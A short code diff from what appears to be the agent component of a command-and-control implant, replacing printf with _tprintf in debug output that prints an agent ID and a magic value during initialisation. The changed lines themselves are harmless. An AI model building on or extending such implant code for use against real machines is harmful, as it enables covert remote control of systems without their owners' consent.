@@ -20,8 +20,8 @@ VOID RevntInit()
     Instance.Session.AgentID = RandomNumber32();
     Instance.Config.Sleeping = CONFIG_SLEEP;
 
-    printf( "AgentID     => %x\n", Instance.Session.AgentID );
-    printf( "Magic Value => %x\n", REVNT_MAGIC_VALUE );
+    _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
+    _tprintf( "Magic Value => %x\n", REVNT_MAGIC_VALUE );
 }
 
 VOID AnonPipeRead( HANDLE hSTD_OUT_Read )
